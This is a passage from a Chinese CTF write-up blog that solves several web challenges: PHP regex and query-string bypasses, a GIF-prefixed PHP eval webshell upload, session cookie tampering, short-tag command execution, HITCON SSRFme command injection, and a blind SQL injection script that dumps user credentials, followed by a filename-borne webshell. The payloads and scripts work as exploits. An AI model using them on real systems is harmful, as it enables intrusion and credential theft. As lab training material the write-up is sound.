cutE!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计：</p><p>$_SERVER[‘QUERY_STRING’]获取的是?后面的值，并且不能有下划线和”%5f”，可以使用”.”或”%5绕过”</p><p>GET传参b_u_p_t不能有23333但是正则需要匹配到23333，可以使用%0a绕过(正则只匹配开头和结尾)</p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?b.u.p.t=23333%0A</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240115092606793.png" alt="image-20240115092606793"></p><p>提示flag在secrettw.php </p><p>访问secrettw.php</p><p><img src="/../images/image-20240115092652187.png" alt="image-20240115092652187"></p><p>提示只有本地才能查看，F12看下</p><p><img src="/../images/image-20240115092741692.png" alt="image-20240115092741692"></p><p>JSFUCK，直接在控制台运行</p><p><img src="/../images/image-20240115092809678.png" alt="image-20240115092809678"></p><p>提示post传参Merak，传一下，得到源码</p><p><img src="/../images/image-20240115092850442.png" alt="image-20240115092850442"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>代码审计：</p><p>定义了一个函数change，先对参数进行base64解密，然后对v的每个值的ascii码加上i*2，最后转换成字符串。</p><p>ip需要等于127.0.0.1，并且GET传参2333等于todat is a happy day</p><p>利用change函数对get传参file进行加密</p><p>构造exp:</p><p>GET传参2333使用data伪协议，file传参应该为flag.php，根据change函数写出对应解密脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240115094513866.png" alt="image-20240115094513866"></p><h1 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h1><p>注册登录，发现可以上传头像</p><p><img src="/../images/image-20240115195846458.png" alt="image-20240115195846458"></p><p>这里使用了<strong>exif_imagetype</strong>函数，通过文件前几个字节判断文件的类型</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后执行命令</p><p><img src="/../images/image-20240115200131529.png" alt="image-20240115200131529"></p><p>拿到flag</p><p><img src="/../images/image-20240115200206926.png" alt="image-20240115200206926"></p><h1 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h1><p>访问环境</p><p><img src="/../images/image-20240115200346544.png" alt="image-20240115200346544"></p><p>如图，需要100元才能购买flag</p><p>选择第一个商品，抓包看一下</p><p><img src="/../images/image-20240115200712606.png" alt="image-20240115200712606"></p><p>对session解密</p><p><img src="/../images/image-20240115200753320.png" alt="image-20240115200753320"></p><p>把39改成399，id改为2</p><p><img src="/../images/image-20240115200915430.png" alt="image-20240115200915430"></p><p>得到flag</p><p><img src="/../images/image-20240115201017175.png" alt="image-20240115201017175"></p><p><img src="/../images/image-20240115201009632.png" alt="image-20240115201009632"></p><h1 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h1><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计：</p><p>定义了两个函数不允许写入黑名单的内容</p><p>过滤了php，使用短标签<?=?>来代替，相当于**&lt;? echo&gt;;**   。使用”.”拼接</p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=(p.hpinfo)()?&gt;</span><br></pre></td></tr></table></figure><p>写入</p><p>pwd查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=pwd</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240116093421790.png" alt="image-20240116093421790"></p><p><img src="/../images/image-20240116093510146.png" alt="image-20240116093510146"></p><p>尝试读取，过滤了空格，使用%09代替(或者\t)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=`cat%09/f*`?&gt;</span><br></pre></td></tr></table></figure><p>然后pwd获取文件目录</p><p>访问得到flag</p><p><img src="/../images/image-20240116095156452.png" alt="image-20240116095156452"></p><h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>首先创建一个沙箱文件夹，路径为sanbox&#x2F;+md5加密orange和ip地址</p><p>然后命令执行url，命令执行的前提是前面必须要有一个和这个命令一样的文件夹</p><p>命令执行的结果会存到以filename参数命名的文件夹里</p><p>我们先看下根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&amp;filename=aaa</span><br></pre></td></tr></table></figure><p>路径为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sandbox/(orange+ip)md5加密/aaa</span><br></pre></td></tr></table></figure><p>可以看到根目录下有flag和readflag</p><p><img src="/../images/image-20240116211139889.png" alt="image-20240116211139889"></p><p>那么我们就需要使用readflag读取flag</p><p>先构造一个bash -c &#x2F;readflag|的目录</p><p>这里使用bash -c相当于.&#x2F;readflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&amp;filename=bash -c /readflag|</span><br></pre></td></tr></table></figure><p>然后读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;file=aaa</span><br></pre></td></tr></table></figure><p>访问得到flag</p><p><img src="/../images/image-20240116211634123.png" alt="image-20240116211634123"></p><p>或者直接用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://f4334615-026a-4151-aa24-7f646ec51cf5.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">requests.get(target+<span class="string">&quot;/?url=&amp;filename=|bash -c /readflag&quot;</span>)</span><br><span class="line">requests.get(target+<span class="string">&quot;/?url=file:|bash -c /readflag&amp;filename=a&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(requests.get(target+<span class="string">&quot;/sandbox/b128179d742ee5f050b60a1321fdc512/aaa&quot;</span>).text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240116212038170.png" alt="image-20240116212038170"></p><h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>打开环境，提示登录</p><p><img src="/../images/image-20240117093544792.png" alt="image-20240117093544792"></p><p>看看robots.txt，提示备份文件</p><p><img src="/../images/image-20240117093628083.png" alt="image-20240117093628083"></p><p>但是index.php没有备份</p><p><img src="/../images/image-20240117093704458.png" alt="image-20240117093704458"></p><p>继续F12查看一下</p><p><img src="/../images/image-20240117093747499.png" alt="image-20240117093747499"></p><p>看到有image.php?id&#x3D;2，可能有SQL注入</p><p>看看备份文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>GET传参id和path，但是对id和path做了反斜杠处理</p><p>str_repalce()则是对经addslashes()处理后的id和path进行替换</p><p>举个例子：</p><p>当我们传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\0  会变成id=\\0</span><br></pre></td></tr></table></figure><p>0会被替换为空，那么只剩下一个反斜杠，而反斜杠会注释掉id后面的单引号，我们再对path的参数末尾加上注释，注释path后面的单引号，构造永真</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\0&amp;path= or 1%23</span><br></pre></td></tr></table></figure><p>实际是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27; or path = &#x27; or 1</span><br></pre></td></tr></table></figure><p>那么页面就会正常显示</p><p><img src="/../images/image-20240117095325357.png" alt="image-20240117095325357"></p><p>但是这里是盲注，使用大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url_format,length=<span class="literal">None</span></span>):</span><br><span class="line">    rlt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url  = url_format</span><br><span class="line">    <span class="keyword">if</span> length==<span class="literal">None</span>:</span><br><span class="line">        length = <span class="number">30</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    <span class="comment">#从可打印字符开始</span></span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        ends = <span class="number">126</span></span><br><span class="line">        tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin&lt;ends:</span><br><span class="line">            r = requests.get(url.<span class="built_in">format</span>(l,tmp))</span><br><span class="line">            <span class="keyword">if</span> r.content!=<span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">                begin = tmp+<span class="number">1</span></span><br><span class="line">                tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ends = tmp</span><br><span class="line">                tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">        <span class="comment">#酌情删除，毕竟一般库表列里都没有空格</span></span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        rlt+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(rlt)</span><br><span class="line">    <span class="keyword">return</span> rlt.rstrip()</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;数据库名为：&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x636973636e66696e616c),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;表名为：&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=0x636973636e66696e616c and table_name=0x7573657273),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;列名为：&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(username)%20from%20users),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;用户名为：&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(password)%20from%20users),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密码为：&#x27;</span>,exp(url))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240117102124449.png" alt="image-20240117102124449"></p><p>登陆成功</p><p><img src="/../images/image-20240117102152906.png" alt="image-20240117102152906"></p><p>这里需要上传文件，我们传个马试试</p><p><img src="/../images/image-20240117102239075.png" alt="image-20240117102239075"></p><p>不允许上传php文件，但可以上传phtml文件</p><p>上传之后我们可以发现文件名是被写入这个php文件的，那么就把一句话写在文件名中</p><p><img src="/../images/image-20240117104306897.png" alt="image-20240117104306897"></p><p><img src="/../images/image-20240117104250568.png" alt="image-20240117104250568"></p><p>蚁剑直连</p><p><img src="/../images/image-20240117104339248.png" alt="image-20240117104339248"></p><p>得到flag</p><p><img src="/../images/image-20240117104416528.png" 